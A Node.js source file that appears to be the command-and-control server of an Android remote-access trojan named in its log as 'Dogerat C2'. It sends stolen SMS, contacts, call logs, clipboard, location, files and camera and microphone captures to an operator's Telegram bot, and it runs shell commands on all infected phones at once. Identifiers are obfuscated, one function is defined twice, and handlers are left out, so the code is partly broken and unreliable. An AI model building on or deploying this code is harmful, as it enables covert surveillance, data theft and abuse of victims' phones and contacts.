const WebSocket = require("ws");
const TelegramBot = require("node-telegram-bot-api");
const express = require("express");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
require("dotenv").config();

const appServer = express();
const appSocket = new WebSocket.Server({ noServer: true });
const appBot = new TelegramBot(process.env.TOKEN, { polling: true });
const app = express();
const upload = multer({ dest: "uploads/" });
let appClients = new Map();
let id = process.env.ID;
let currentUuid = null;
let currentNumber = null;
let currentTitle = null;
let currentPath = "/"; // File manager current path
let fileManagerState = new Map(); // Track file manager sessions per device

app.use(express.static("public"));
app.use(express.json({ limit: "50mb" }));
app.use("/uploads", express.static("uploads"));

// File Manager State Management
function getFileManagerKeyboard(uuid, path) {
  return {
    inline_keyboard: [
      [{ text: `📁 Back to ${path.split('/').slice(0,-1).join('/') || '/' }`, callback_data: `fm_back:${uuid}:${path}` }],
      [{ text: `📂 Refresh`, callback_data: `fm_refresh:${uuid}:${path}` }],
      [{ text: `📱 Home`, callback_data: `fm_home:${uuid}` }]
    ]
  };
}

// Cleanup old uploads
setInterval(() => {
  fs.readdir("uploads", (err, files) => {
    files.forEach(file => {
      fs.unlink(`uploads/${file}`, () => {});
    });
  });
}, 300000);

app.post("/upload", upload.single("file"), (req, res) => {
  res.json({ status: "ok", file: req.file.filename });
});

app.post("/text", express.raw({ type: "*/*", limit: "10mb" }), (req, res) => {
  const uuid = req.headers["x-uuid"];
  const client = appClients.get(uuid);
  if (client) {
    appBot.sendMessage(id, `📄 <b>Text from ${client.model}</b>\n\n${req.body.toString()}`, { parse_mode: "HTML" });
  }
  res.json({ status: "ok" });
});

app.post("/location", express.json(), (req, res) => {
  const uuid = req.headers["x-uuid"];
  const client = appClients.get(uuid);
  if (client) {
    appBot.sendLocation(id, req.body.latitude, req.body.longitude, null, {
      reply_markup: {
        inline_keyboard: [[{ text: "🗺️ Open Maps", url: `https://maps.google.com/?q=${req.body.latitude},${req.body.longitude}` }]]
      }
    });
  }
  res.json({ status: "ok" });
});

// WebSocket Connection
appServer.on("upgrade", function(request, socket, head) {
  appSocket.handleUpgrade(request, socket, head, function(_0x4d0a4e) {
    const uuid = Date.now().toString();
    _0x4d0a4e.uuid = uuid;
    appSocket.clients.forEach(function(_0x2d1f4e) {
      if (_0x2d1f4e.readyState === WebSocket.OPEN) {
        _0x2d1f4e.send(JSON.stringify({ type: "connected_devices", count: appSocket.clients.size }));
      }
    });
    appBot.sendMessage(id, "°• 𝙉𝙚𝙬 𝘿𝙚𝙫𝙞𝙘𝙚 𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 ✅\n\n• ʏᴏᴜʀ ᴛᴏᴛᴀʟ ᴅᴇᴠɪᴄᴇꜱ: <b>" + appSocket.clients.size + "</b>", {
      "parse_mode": "HTML",
      "reply_markup": {
        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        "resize_keyboard": true
      }
    });
    _0x4d0a4e.on("message", function(_0x2c2f44) {
      try {
        const data = JSON.parse(_0x2c2f44);
        if (data.type === "init") {
          appClients.set(uuid, data);
          let devicesList = "";
          appClients.forEach((_0x1c6e24, _0x1f4e2a) => {
            devicesList += `• <b>${_0x1c6e24.model}</b> (${_0x1c6e24.androidVersion})\n`;
          });
          appBot.sendMessage(id, `📱 <b>Connected Devices (${appClients.size}):</b>\n\n${devicesList}`, { parse_mode: "HTML" });
        } else if (data.type === "response") {
          const client = appClients.get(uuid);
          if (client) {
            appBot.sendDocument(id, Buffer.from(data.data), {
              caption: `📱 Response from <b>${client.model}</b>\n\n${data.message || ""}`,
              parse_mode: "HTML"
            });
          }
        } else if (data.type === "file_list") {
          // File Manager Response
          handleFileList(uuid, data.path, data.files);
        }
      } catch (e) {
        const message = _0x2c2f44.toString();
        const parts = message.split(":");
        if (parts[0] === "apps") {
          const client = appClients.get(uuid);
          appBot.sendMessage(id, `📱 <b>Installed Apps (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
        } else if (parts[0] === "device_info") {
          const client = appClients.get(uuid);
          appBot.sendMessage(id, `ℹ️ <b>Device Info (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
        } else if (parts[0] === "clipboard") {
          const client = appClients.get(uuid);
          appBot.sendMessage(id, `📋 <b>Clipboard (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
        } else if (parts[0] === "contacts") {
          const client = appClients.get(uuid);
          appBot.sendMessage(id, `📞 <b>Contacts (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
        } else if (parts[0] === "calls") {
          const client = appClients.get(uuid);
          appBot.sendMessage(id, `📲 <b>Call Logs (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
        } else if (parts[0] === "messages") {
          const client = appClients.get(uuid);
          appBot.sendMessage(id, `💬 <b>SMS (${client.model}):</b>\n\n${parts.slice(1).join(":")}`, { parse_mode: "HTML" });
        }
      }
    });
    _0x4d0a4e.on("close", function() {
      appClients.delete(uuid);
      appSocket.clients.forEach(function(_0x4e2d1f) {
        if (_0x4e2d1f.readyState === WebSocket.OPEN) {
          _0x4e2d1f.send(JSON.stringify({ type: "connected_devices", count: appSocket.clients.size }));
        }
      });
      appBot.sendMessage(id, "°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝘿𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 ❌\n\n• 𝙔𝙤𝙪𝙧 𝙩𝙤𝙩𝙖𝙡 𝙙𝙚𝙫𝙞𝙘𝙚𝙨: <b>" + appSocket.clients.size + "</b>", {
        "parse_mode": "HTML",
        "reply_markup": {
          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
          "resize_keyboard": true
        }
      });
    });
  });
});

// File Manager Handler
function handleFileList(uuid, path, files) {
  const client = appClients.get(uuid);
  if (!client) return;

  let keyboard = [];
  let text = `📁 <b>File Manager - ${client.model}</b>\n\n`;
  text += `📍 <b>Current Path:</b> <code>${path}</code>\n\n`;

  files.forEach(file => {
    const size = file.isDir ? "📁 Folder" : `📄 ${formatFileSize(file.size)}`;
    const emoji = file.isDir ? "📁" : getFileEmoji(file.name);
    
    text += `${emoji} <code>${file.name}</code> ${size}\n`;
    
    if (file.isDir) {
      keyboard.push([{ text: `${emoji} ${file.name}`, callback_data: `fm_open:${uuid}:${path}/${file.name}` }]);
    } else {
      keyboard.push([{ text: `${emoji} ${file.name} (${formatFileSize(file.size)})`, callback_data: `fm_download:${uuid}:${path}/${file.name}` }]);
    }
  });

  // Add navigation buttons
  keyboard.push([{ text: "↩️ Back", callback_data: `fm_back:${uuid}:${path}` }]);
  keyboard.push([{ text: "🏠 Home", callback_data: `fm_home:${uuid}` }]);
  keyboard.push([{ text: "🔄 Refresh", callback_data: `fm_refresh:${uuid}:${path}` }]);

  appBot.sendMessage(id, text, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: keyboard.slice(0, 10) } // Telegram limit
  });
}

function formatFileSize(bytes) {
  if (bytes === 0) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function getFileEmoji(filename) {
  const ext = path.extname(filename).toLowerCase();
  const icons = {
    '.jpg': '🖼️', '.jpeg': '🖼️', '.png': '🖼️', '.gif': '🖼️',
    '.mp4': '🎥', '.avi': '🎥', '.mkv': '🎥',
    '.mp3': '🎵', '.wav': '🎵', '.flac': '🎵',
    '.pdf': '📄', '.doc': '📄', '.txt': '📄',
    '.apk': '📱'
  };
  return icons[ext] || '📄';
}

// Continue with bot handlers in PART 2...
appBot.on("callback_query", _0x425827 => {
  const _0x440ba5 = _0x425827.message;
  const _0x9f09ec = _0x425827.data;
  const _0x2f3f8b = _0x9f09ec.split(":")[0];
  const _0x39894d = _0x9f09ec.split(":")[1]; // UUID
  
  // 🔥 NEW FEATURE 1: FILE MANAGER
  if (_0x2f3f8b === "file_manager") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) {
        client.send("file_manager:/"); // Start from root
      }
    });
    appBot.answerCallbackQuery(_0x425827.id, "📁 Loading file manager...");
    appBot.deleteMessage(id, _0x440ba5.message_id);
  }

  // 🔥 NEW FEATURE 2: NOTIFICATION CONTROL
  if (_0x2f3f8b === "notification_off") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) {
        client.send("notification_off");
      }
    });
    appBot.answerCallbackQuery(_0x425827.id, "🔇 Notifications OFF");
    appBot.editMessageText(`✅ <b>Notifications Disabled</b> on ${_0x39894d}`, {
      chat_id: id,
      message_id: _0x440ba5.message_id,
      parse_mode: "HTML"
    });
  }

  if (_0x2f3f8b === "notification_on") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) {
        client.send("notification_on");
      }
    });
    appBot.answerCallbackQuery(_0x425827.id, "🔔 Notifications ON");
    appBot.editMessageText(`✅ <b>Notifications Enabled</b> on ${_0x39894d}`, {
      chat_id: id,
      message_id: _0x440ba5.message_id,
      parse_mode: "HTML"
    });
  }

  // 🔥 FILE MANAGER NAVIGATION
  if (_0x2f3f8b === "fm_open") {
    const path = _0x9f09ec.split(":")[2];
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) {
        client.send(`file_manager:${path}`);
      }
    });
    appBot.answerCallbackQuery(_0x425827.id, `📁 Opening ${path}`);
  }

  if (_0x2f3f8b === "fm_download") {
    const path = _0x9f09ec.split(":")[2];
    const client = appClients.get(_0x39894d);
    appBot.answerCallbackQuery(_0x425827.id, `📥 Downloading ${path}`);
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) {
        client.send(`file:${path}`);
      }
    });
    appBot.editMessageText(`📥 <b>Downloading:</b> <code>${path}</code>\n\nDevice: ${client.model}`, {
      chat_id: id,
      message_id: _0x440ba5.message_id,
      parse_mode: "HTML"
    });
  }

  if (_0x2f3f8b === "fm_back") {
    const path = _0x9f09ec.split(":")[2];
    const parentPath = path.split('/').slice(0, -1).join('/') || '/';
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) {
        client.send(`file_manager:${parentPath}`);
      }
    });
    appBot.answerCallbackQuery(_0x425827.id, "↩️ Going back...");
  }

  if (_0x2f3f8b === "fm_home") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) {
        client.send("file_manager:/");
      }
    });
    appBot.answerCallbackQuery(_0x425827.id, "🏠 Going home...");
  }

  if (_0x2f3f8b === "fm_refresh") {
    const path = _0x9f09ec.split(":")[2];
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) {
        client.send(`file_manager:${path}`);
      }
    });
    appBot.answerCallbackQuery(_0x425827.id, "🔄 Refreshing...");
  }

  // ORIGINAL DEVICE MENU (Updated with NEW buttons)
  if (_0x2f3f8b === "device") {
    const client = appClients.get(_0x39894d);
    appBot.editMessageText("°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>" + (client?.model || _0x39894d) + "</b>", {
      chat_id: id,
      message_id: _0x440ba5.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 𝘼𝙥𝙥𝙨", callback_data: "apps:" + _0x39894d }, 
           { text: "ℹ️ 𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤", callback_data: "device_info:" + _0x39894d }],
          
          [{ text: "🗂️ 𝗙𝗜𝗟𝗘 𝗠𝗔𝗡𝗔𝗚𝗘𝗥", callback_data: "file_manager:" + _0x39894d }, 
           { text: "🔔 𝗧𝗢𝗚𝗚𝗟𝗘 𝗡𝗢𝗧𝗜𝗙", callback_data: "notification_toggle:" + _0x39894d }],
          
          [{ text: "📁 𝙂𝙚𝙩 𝙛𝙞𝙡𝙚", callback_data: "file:" + _0x39894d }, 
           { text: "🗑️ 𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚", callback_data: "delete_file:" + _0x39894d }],
          
          [{ text: "📋 𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙", callback_data: "clipboard:" + _0x39894d }, 
           { text: "🎤 𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚", callback_data: "microphone:" + _0x39894d }],
          
          [{ text: "📷 𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖", callback_data: "camera_main:" + _0x39894d }, 
           { text: "🤳 𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖", callback_data: "camera_selfie:" + _0x39894d }],
          
          [{ text: "📍 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣", callback_data: "location:" + _0x39894d }, 
           { text: "🍞 𝙏𝙤𝙖𝙨𝙩", callback_data: "toast:" + _0x39894d }],
          
          [{ text: "📞 𝘾𝙖𝙡𝙡𝙨", callback_data: "calls:" + _0x39894d }, 
           { text: "👥 𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨", callback_data: "contacts:" + _0x39894d }],
          
          [{ text: "📳 𝙑𝙞𝙗𝙧𝙖𝙩𝙚", callback_data: "vibrate:" + _0x39894d }, 
           { text: "🔔 𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣", callback_data: "show_notification:" + _0x39894d }],
          
          [{ text: "💬 𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨", callback_data: "messages:" + _0x39894d }, 
           { text: "📤 𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚", callback_data: "send_message:" + _0x39894d }],
          
          [{ text: "🎵 𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤", callback_data: "play_audio:" + _0x39894d }, 
           { text: "⏹️ 𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤", callback_data: "stop_audio:" + _0x39894d }],
          
          [{ text: "📨 𝙎𝙚𝙣𝙙 𝙩𝙤 𝘼𝙇𝙇 𝘾𝙊𝙉𝙏𝘼𝘾𝙏𝙎", callback_data: "send_message_to_all:" + _0x39894d }]
        ]
      },
      parse_mode: "HTML"
    });
    return;
  }

  // Notification Toggle (shows OFF/ON buttons)
  if (_0x2f3f8b === "notification_toggle") {
    appBot.editMessageText("🔔 <b>Notification Control</b>", {
      chat_id: id,
      message_id: _0x440ba5.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔇 𝗢𝗙𝗙", callback_data: "notification_off:" + _0x39894d }],
          [{ text: "🔔 𝗢𝗡", callback_data: "notification_on:" + _0x39894d }]
        ]
      },
      parse_mode: "HTML"
    });
    return;
  }

  // Continue with all original handlers...
  if (_0x2f3f8b === "calls") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) client.send("calls");
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    sendProcessingMessage();
  }

  if (_0x2f3f8b === "contacts") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) client.send("contacts");
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    sendProcessingMessage();
  }

  if (_0x2f3f8b === "messages") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) client.send("messages");
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    sendProcessingMessage();
  }

  if (_0x2f3f8b === "apps") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) client.send("apps");
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    sendProcessingMessage();
  }

  if (_0x2f3f8b === "device_info") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) client.send("device_info");
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    sendProcessingMessage();
  }

  if (_0x2f3f8b === "clipboard") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) client.send("clipboard");
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    sendProcessingMessage();
  }

  // Continue with camera, location, etc. handlers (same as original)...
  if (_0x2f3f8b === "camera_main") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) client.send("camera_main");
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    sendProcessingMessage();
  }

  if (_0x2f3f8b === "camera_selfie") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) client.send("camera_selfie");
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    sendProcessingMessage();
  }

  if (_0x2f3f8b === "location") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) client.send("location");
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    sendProcessingMessage();
  }

  if (_0x2f3f8b === "vibrate") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) client.send("vibrate");
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    sendProcessingMessage();
  }

  if (_0x2f3f8b === "stop_audio") {
    appSocket.clients.forEach(client => {
      if (client.uuid === _0x39894d) client.send("stop_audio");
    });
    appBot.deleteMessage(id, _0x440ba5.message_id);
    sendProcessingMessage();
  }

  // Input handlers (unchanged)
  if (_0x2f3f8b === "send_message") {
    appBot.deleteMessage(id, _0x440ba5.message_id);
    appBot.sendMessage(id, "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎", {
      reply_markup: { force_reply: true }
    });
    currentUuid = _0x39894d;
  }

  // ... (all other input handlers remain same)
});

function sendProcessingMessage() {
  appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {
    parse_mode: "HTML",
    reply_markup: {
      keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
      resize_keyboard: true
    }
  });
}
// Message Handlers (Complete)
appBot.on("message", _0x4e5c2a => {
  const _0x1b3f4d = _0x4e5c2a.text;
  const _0x2a8f6b = _0x4e5c2a.message_id;
  
  if (_0x4e5c2a.reply_to_message) {
    if (currentUuid) {
      appSocket.clients.forEach(client => {
        if (client.uuid === currentUuid) {
          client.send("sms:" + _0x4e5c2a.reply_to_message.text + ":" + _0x1b3f4d);
        }
      });
      appBot.deleteMessage(id, _0x4e5c2a.message_id);
      appBot.deleteMessage(id, _0x4e5c2a.reply_to_message.message_id);
      sendProcessingMessage();
    }
    return;
  }

  if (_0x1b3f4d.includes("𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨")) {
    let _0x4b2e1f = "📱 <b>Connected Devices:</b>\n\n";
    let _0x3d8f2a = [];
    appClients.forEach((client, uuid) => {
      _0x4b2e1f += `• <code>${uuid}</code> - ${client.model}\n`;
      _0x3d8f2a.push({ text: client.model, callback_data: "device:" + uuid });
    });
    _0x4b2e1f += `\n<b>Total: ${appClients.size}</b>`;
    
    const inlineKeyboard = [];
    for (let i = 0; i < _0x3d8f2a.length; i += 2) {
      inlineKeyboard.push(_0x3d8f2a.slice(i, i + 2));
    }
    
    appBot.sendMessage(id, _0x4b2e1f, {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: inlineKeyboard }
    });
    appBot.deleteMessage(id, _0x4e5c2a.message_id);
    return;
  }

  if (_0x1b3f4d.includes("𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙")) {
    appBot.sendMessage(id, "°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚", {
      reply_markup: {
        inline_keyboard: [[
          { text: "🐚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙎𝙝𝙚𝙡𝙡", callback_data: "cmdshell" },
          { text: "📱 𝘼𝙡𝙡 𝘿𝙚𝙫𝙞𝙘𝙚𝙨", callback_data: "all_devices" }
        ]]
      }
    });
    appBot.deleteMessage(id, _0x4e5c2a.message_id);
    return;
  }

  // Execute command on ALL devices
  appSocket.clients.forEach(client => {
    client.send("cmd:" + _0x1b3f4d);
  });
  
  appBot.sendMessage(id, `°• 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙚𝙭𝙚𝙘𝙪𝙩𝙚𝙙 𝙤𝙣 𝘼𝙇𝙇 𝙙𝙚𝙫𝙞𝙘𝙚𝙨:\n\n<code>${_0x1b3f4d}</code>`, {
    parse_mode: "HTML",
    reply_markup: {
      keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
      resize_keyboard: true
    }
  });
  appBot.deleteMessage(id, _0x4e5c2a.message_id);
});

// Utility Functions
function sendProcessingMessage() {
  appBot.sendMessage(id, "⏳ <b>Processing request...</b>", {
    reply_markup: {
      keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
      resize_keyboard: true
    },
    parse_mode: "HTML"
  });
}

// Server Start
const server = app.listen(80, () => {
  console.log("🚀 Dogerat C2 Server Started on Port 80");
});

// Cleanup on exit
process.on('SIGINT', () => {
  server.close();
  process.exit();
});
